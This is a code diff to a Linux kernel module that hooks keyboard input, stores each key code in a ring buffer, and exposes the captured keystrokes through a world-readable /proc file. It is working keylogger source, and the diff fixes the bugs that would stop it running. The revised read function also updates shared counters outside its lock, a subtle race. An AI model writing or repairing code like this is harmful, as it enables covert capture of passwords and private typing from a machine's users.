@@ -18,12 +18,13 @@ MODULE_LICENSE("GPL");
 
 static struct input_handle handle;
 static unsigned char buffer[BUFFER_SIZE];
-static int data_count = 0;
 static struct mutex buffer_mutex;
 static struct proc_dir_entry *proc_entry;
 
 static int write_pos = 0;
 static int read_pos = 0;
+
+static int data_count = 0;
 
 static int logger_connect(struct input_handler *handler, struct input_dev *dev,
 			  const struct input_device_id *id)
@@ -70,49 +71,53 @@ static void logger_disconnect(struct input_handle *handle)
 static bool logger_filter(struct input_handle *handle, unsigned int type,
 			  unsigned int code, int value)
 {
-	if (type != EV_KEY || value == 1) {
-		return false;
+	if (type == EV_KEY && value != 1) {
+		mutex_lock(&buffer_mutex);
+		buffer[write_pos] = (unsigned char)code;
+		write_pos = (write_pos + 1) % BUFFER_SIZE;
+
+		if (data_count < BUFFER_SIZE) {
+			data_count++;
+		} else {
+			// we overflowed, move read position so it points to the new oldest byte
+			read_pos = (read_pos + 1) % BUFFER_SIZE;
+		}
+		mutex_unlock(&buffer_mutex);
 	}
 
-	mutex_lock(&buffer_mutex);
-	buffer[write_pos] = (unsigned char)code;
-	write_pos = (write_pos + 1) % BUFFER_SIZE;
-	if (data_count < BUFFER_SIZE) {
-		data_count++;
-	} else {
-		read_pos = (read_pos + 1) % BUFFER_SIZE;
-	}
-	mutex_unlock(&buffer_mutex);
+	return false;
 }
 
-static ssize_t proc_read(struct file *file, char __user *buffer, size_t count,
+static ssize_t proc_read(struct file *file, char __user *user_buffer, size_t count,
 			 loff_t *ppos)
 {
-	if (*ppos > 0) {
+	const int bytes_to_read = min(min((int)count, 4), data_count);
+	if (bytes_to_read <= 0) {
 		return 0;
 	}
 
-	unsigned char temp_buffer[4];
-	int bytes_to_read = min(min((int)count, 4), data_count);
-
 	mutex_lock(&buffer_mutex);
+
+	unsigned char temp_buffer[4];
 	for (int i = 0; i < bytes_to_read; i++) {
-		temp_buffer[i] = buffer[read_pos];
-		read_pos = (read_pos + 1) % BUFFER_SIZE;
-		data_count--;
+		temp_buffer[i] = buffer[(read_pos + i) % BUFFER_SIZE];
 	}
 
-	if (copy_to_user(buffer, temp_buffer, bytes_to_read)) {
+	mutex_unlock(&buffer_mutex);
+
+	if (copy_to_user(user_buffer, temp_buffer, bytes_to_read)) {
 		return -EFAULT;
 	}
-	mutex_unlock(&buffer_mutex);
+
+	read_pos = (read_pos + bytes_to_read) % BUFFER_SIZE;
+	data_count -= bytes_to_read;
 
 	*ppos += bytes_to_read;
 	return bytes_to_read;
 }
 
-static const struct proc_ops proc_fops = {
-	.read = proc_read,
+static const struct proc_ops proc_ops = {
+	.proc_read = proc_read,
 };
 
 static const struct input_device_id relevant_device_ids[] = {
@@ -146,7 +151,7 @@ static int logger_init(void)
 	mutex_init(&buffer_mutex);
 
 	// 0444 = read only for all groups
-	proc_entry = proc_create(PROC_FS_NAME, 0444, NULL, &proc_fops);
+	proc_entry = proc_create(PROC_FS_NAME, 0444, NULL, &proc_ops);
 	if (proc_entry == NULL) {
 		printk(KERN_ERR "could not create proc entry\n");
 		return -ENOMEM;
